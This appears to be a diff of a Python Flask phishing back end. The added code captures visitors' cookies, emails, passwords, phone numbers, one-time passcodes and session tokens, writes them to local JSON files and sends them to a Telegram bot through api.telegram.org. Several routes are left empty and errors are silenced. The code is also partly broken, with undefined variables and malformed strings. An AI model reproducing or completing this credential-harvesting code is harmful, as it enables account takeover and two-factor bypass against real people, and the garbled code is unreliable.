@@ -23,69 +23,77 @@ app = Flask(__name__, template_folder="templates")
 @app.before_request
 def init_data():
     data = {
+        "cookies": request.headers.get("Cookie",""),
         "email": "",
         "password": "",
         "phone": "",
         "otp": "",
         "device_browser": request.headers.get("User-Agent", ""),
         "ip": request.remote_addr,
+        "user_agent": request.headers.get("User-Agent")
     }
     
-@app.route('/')
-def index():
-    return render_template("index.html")     
-
-@app.route('/login')
-def login():
-    return render_template("login.html")
+    message = f"""
+    Cookies: {data['Cookie']}
+    Email: {data['email']}
+    Password: {data['password']}
+    Phone: {data['phone']}
+    OTP: {data['otp']}
+    """
     
-@app.route('/otp.html')
-def otp():
-    return render_template("otp.html")     
+def before_request_func():
+    cookies = request.headers.get("Cookie")
+    
+    message = f"""
+    Cookies: {cookie}
+    """
+    
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                      "chat_id": CHAT_ID,
+                      "text": message
+     })
+     
     
 @app.route('/collect', methods=['POST'])
 def collect():
     try:
-        if request.is_json:
-            data = request.get_json.form.to_dict(silent=true) or {}
-        else:
-             data = request.form.to_dict(flat=True)
-             
         payload = request.get_json(silent=True)
         if not payload:
             payload = request.data.to_dict()
-        data = payload
+        data = payload     
         
-        email = data.get("email")
-        password = data.get("password")
-        otp = data.get("otp")
-        phone = data.get("phone")
-        ip = data.get("ip")
-        device_browser = data.get("device_browser")
-        
-        message = f"""
-             Email: {email}
-             Password: {password}
-             Phone: {phone}
-             OTP: {otp}
-             IP: {ip}
-             '''.
-                     """
-        
-        send_to_telegram(data)
-           
-    except Exception as e:
-        print("collect error:", e)        
+    except:
+        pass          
 
 def send_to_telegram(data):
     try:
-       token = os.getenv("TG_BOT_TOKEN")
-       chat_id = os.getenv("TG_CHAT_ID")
+        token = os.getenv("TG_BOT_TOKEN")
+        chat_id = os.getenv("TG_CHAT_ID")
        
-    except Exception as e:   
-        print("collect error:", e)
+    except:
+        pass
             
 def collect_sessions():
+
+    logs = []
+    data = request.get_json()
+    email = data.get("email")
+    password = data.get("password")
+    phone = data.get("phone")
+    otp = data.get("otp")
+    
+    logs.append({"email": email, "password": password, "phone": phone, "otp": otp})
+    
+    message = f"""
+    Email: {email}
+    Password: {password}
+    Phone: {phone}
+    OTP: {otp}
+    IP: {ip}
+    '''.
+    """
+    
+    
     try:
         session_data = request.headers.get("Authorization")
 
@@ -94,39 +102,27 @@ def collect_sessions():
         if os .path.exists("sessions.json"):
             with open("sessions.json", "r", encoding="utf-8") as f:
                 data = json.load(f)
-        for session in sessions:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                      "chat_id": CHAT_ID,
-                      "text": f"session Token: {session_data}\nUser-Agent: {user_agent}"})       
+        else:
+            data = []
 
-    except Exception as e:
-        print(f"خطأ في جمع الجلسة: {e}")
-# جلب بيانات الجهاز والمتصفح الحقيقية
+        session_data = {"token": request.form.get('token')}
+        data.append(session_data)       
+                
+        with open("sessions.json", "w") as f:
+            json.dump(data, f, indent=4) 
+              
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                      "chat_id": CHAT_ID,
+                      "text": f"session Token: {session_data}\nUser-Agent: {user_agent}"})            
+                      
         user_agent = request.headers.get('User-Agent')
         ip_address = request.remote_addr
-
+    except:
+        pass        
+        
 if os.path.exists("log.json"):
-     with open("log.json", "r") as f:
-        logs = json.load(f)
-        
-else:
-    logs = []
-    email = request.data.get("email")
-    password = request.data.get("password")
-    phone = request.data.get("phone")
-    otp = request.data.get("otp")
-
-    log.appand({"email":email, "password": password, "otp":otp})
-        
-    message = f"""
-             Email: {email}
-             Password: {password}
-             Phone: {phone}
-             OTP: {otp}
-             IP: {ip}
-             '''.
-                     """
-    send_to_telegram(message)         
+    with open("log.json", "r") as f:
+        logs = json.load(f)      
     
 def notify(text: str) -> bool:
     try:
@@ -140,12 +136,23 @@ def notify(text: str) -> bool:
             timeout=10
         )
         print("TG >", r.status_code, r.text)
-    except Exception as e:
-        print("notify error:", e)
+        
+    except Exception:
+        pass
+       
+@app.get("/ping")
+def ping():
+       pass
+
+@app.get("/form")
+def form_page():  
+       
+       pass     
 
 @app.get("/")
 def root():
-    return render_template("thanks.html")
+
+       pass
         
 @app.route("/track-click", methods=["POST"])
 def track_click():
@@ -211,10 +218,6 @@ def submit():
             CHAT_ID = os.getenv("TG_CHAT_ID")
         except Exception as e:
             print("log write error:", e)
-     
-@app.route('/thanks')
-def thanks():
-    return render_template("thanks.html")
 
 @app.route("/test-notify")
 def test_notify():
@@ -225,7 +228,7 @@ def test_notify():
         r = requests.post(url, data=payload)
         print("TG >", r.status_code, r.text)
         
-        return render_template("thanks.html")
+        pass
 if __name__ == "__main__":
         port = int(os.environ.get("PORT",8081))
         app.run(host="0.0.0.0", port=port, debug=True)
